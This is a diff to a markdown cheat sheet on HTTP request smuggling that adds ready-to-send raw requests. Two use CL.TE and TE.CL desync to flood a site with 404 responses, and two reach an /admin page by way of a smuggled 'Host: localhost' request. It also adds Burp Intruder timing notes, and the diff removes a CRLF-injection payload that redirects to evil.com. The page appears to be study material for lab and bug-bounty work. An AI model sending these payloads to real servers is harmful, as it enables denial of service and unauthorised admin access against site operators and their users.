@@ -15,7 +15,75 @@ DoS aplication user with 404
 ## How to exploit
 1. Basic payload
 ```
-https://example.com/?lang=en%0D%0ALocation:%20https://evil.com/
+#BurpIntruder to send every second and change version to HTTP/1, no header update
+Note: length is important for this attack
+
+#DoS
+POST / HTTP/1.1
+Host: www.vuln.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+X-Ignore: X
+--------------------------
+
+POST / HTTP/1.1
+Host: www.vuln.com
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+5e
+POST /404 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+--------------
+
+#Bypass
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 116
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+----------------
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+71
+POST /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+
+
+
+Bug Bounty Report
+https://hackerone.com/reports/726773
 ```
 The response is
 ```
